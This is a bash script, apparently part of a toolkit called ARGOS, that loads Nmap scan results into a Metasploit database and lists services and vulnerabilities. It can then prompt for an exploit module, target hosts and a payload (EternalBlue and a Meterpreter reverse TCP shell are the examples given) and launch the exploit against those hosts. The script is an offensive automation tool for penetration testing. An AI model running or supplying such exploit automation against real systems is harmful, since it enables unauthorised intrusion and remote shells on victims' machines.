# metasploit.sh
#!/usr/bin/env bash
###############################################################################
# ARGOS - Metasploit Automation
###############################################################################


source "$(dirname "$0")/../utils.sh"

RED="\033[0;31m"
GREEN="\033[0;32m"
CYAN="\033[0;36m"
RESET="\033[0m"

echo -e "${CYAN}=== METASPLOIT AUTOMATION ===${RESET}"

# Initialize variables with default values
NMAP_XML=""
NMAP_GNMAP=""
LHOST="127.0.0.1"
LPORT="4444"
LOOT_DIR="./loot"
FORCE_DBIMPORT="0"

# Parse command-line arguments
while [[ $# -gt 0 ]]; do
  case "$1" in
    --xml)
      NMAP_XML="$2"; shift 2 ;;
    --gnmap)
      NMAP_GNMAP="$2"; shift 2 ;;
    --lhost)
      LHOST="$2"; shift 2 ;;
    --lport)
      LPORT="$2"; shift 2 ;;
    --loot)
      LOOT_DIR="$2"; shift 2 ;;
    --force-dbimport)
      FORCE_DBIMPORT="1"; shift ;;
    *)
      echo -e "${YELLOW}[!] Unknown option: $1${RESET}"
      echo -e "${CYAN}Usage: $0 --xml <nmap.xml> [--gnmap <gnmap_file>] [--lhost <IP>] [--lport <PORT>] [--loot <loot_dir>] [--force-dbimport]${RESET}"
      exit 1 ;;
  esac
done

# Validate required arguments
if [ -z "$NMAP_XML" ] && [ -z "$NMAP_GNMAP" ]; then
  echo -e "${RED}[!] Usage: $0 --xml <nmap.xml> [--gnmap <gnmap_file>] [--lhost <IP>] [--lport <PORT>] [--loot <loot_dir>] [--force-dbimport]${RESET}"
  exit 1
fi

# Create necessary directories
run_command "mkdir -p \"$LOOT_DIR/output\""
run_command "mkdir -p \"$LOOT_DIR/tmp\""

WORKSPACE="autopwn_ws"
TMPDIR="$LOOT_DIR/tmp"
IPLIST="$TMPDIR/iplist.txt"

# Check for dependencies
declare -A dependencies=(
  ["msfconsole"]="msfconsole"
  ["xmlstarlet"]="xmlstarlet"
  ["sudo"]="sudo"
  ["systemctl"]="systemctl"
  ["msfdb"]="msfdb"
)

for tool in "${!dependencies[@]}"; do
  if ! command -v "${dependencies[$tool]}" >/dev/null; then
    echo -e "${RED}[!] Dependency not found: ${dependencies[$tool]}. Please install it first.${RESET}"
    exit 1
  fi
done

# Start PostgreSQL and Metasploit services
echo -e "${CYAN}[*] Starting PostgreSQL service...${RESET}"
run_command "sudo systemctl start postgresql"

echo -e "${CYAN}[*] Initializing Metasploit Database...${RESET}"
if [ "$FORCE_DBIMPORT" -eq 1 ]; then
  run_command "sudo msfdb init --force"
fi

echo -e "${CYAN}[*] Starting Metasploit Database...${RESET}"
run_command "sudo msfdb start"

# Create Metasploit RC file for automation
RCFILE="$TMPDIR/msf_import.rc"
{
  echo "workspace -a $WORKSPACE"
  echo "workspace $WORKSPACE"
  if [ -n "$NMAP_XML" ]; then
    echo "db_import $NMAP_XML"
  fi
  if [ -n "$NMAP_GNMAP" ]; then
    echo "db_import $NMAP_GNMAP"
  fi
  echo "services -u"
  echo "vulns"
  echo "exit"
} > "$RCFILE"

# Run Metasploit automation
echo -e "${CYAN}[*] Running Metasploit automation...${RESET}"
run_command "msfconsole -q -r \"$RCFILE\""

# Optional: Launch specific exploit modules based on vulnerabilities
echo -e "${CYAN}[?] Would you like to launch exploit modules based on vulnerabilities found? (y/N): ${RESET}"
read -r LAUNCH_EXPLOITS
if [[ "$LAUNCH_EXPLOITS" =~ ^[Yy]$ ]]; then
  echo -ne "${CYAN}Enter Metasploit module path (e.g., exploit/windows/smb/ms17_010_eternalblue): ${RESET}"
  read -r MSF_MODULE
  if [ -n "$MSF_MODULE" ]; then
    echo -ne "${CYAN}Enter RHOSTS (comma-separated IPs or ranges): ${RESET}"
    read -r RHOSTS
    echo -ne "${CYAN}Enter payload (e.g., windows/meterpreter/reverse_tcp): ${RESET}"
    read -r PAYLOAD
    echo -ne "${CYAN}Enter LHOST (default=$LHOST): ${RESET}"
    read -r CUSTOM_LHOST
    CUSTOM_LHOST=${CUSTOM_LHOST:-$LHOST}
    echo -ne "${CYAN}Enter LPORT (default=$LPORT): ${RESET}"
    read -r CUSTOM_LPORT
    CUSTOM_LPORT=${CUSTOM_LPORT:-$LPORT}

    EXPLOIT_RC="$TMPDIR/msf_exploit.rc"
    {
      echo "use $MSF_MODULE"
      echo "set RHOSTS $RHOSTS"
      echo "set PAYLOAD $PAYLOAD"
      echo "set LHOST $CUSTOM_LHOST"
      echo "set LPORT $CUSTOM_LPORT"
      echo "exploit -j -z"
      echo "exit"
    } > "$EXPLOIT_RC"

    echo -e "${CYAN}[*] Launching Metasploit exploit...${RESET}"
    run_command "msfconsole -q -r \"$EXPLOIT_RC\""
  else
    echo -e "${YELLOW}[!] No module path provided. Skipping exploit launch.${RESET}"
  fi
fi

echo -e "${GREEN}[Metasploit] Done. Results in $LOOT_DIR/output.${RESET}"
exit 0
